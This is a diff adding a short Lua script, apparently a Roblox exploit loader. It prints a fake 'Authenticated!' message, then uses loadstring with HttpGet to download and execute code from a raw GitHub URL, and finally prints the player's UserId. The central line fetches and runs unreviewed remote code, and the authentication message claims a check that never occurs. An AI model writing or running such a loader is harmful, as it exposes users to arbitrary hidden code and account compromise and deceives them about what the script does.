@@ -1,0 +1,5 @@
+print("Authenticated!")
+wait(06)
+print("Loaded!")
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/RayZo1/idk/main/idk'),true))()
+print("Welcome "..game.Players.LocalPlayer.UserId)
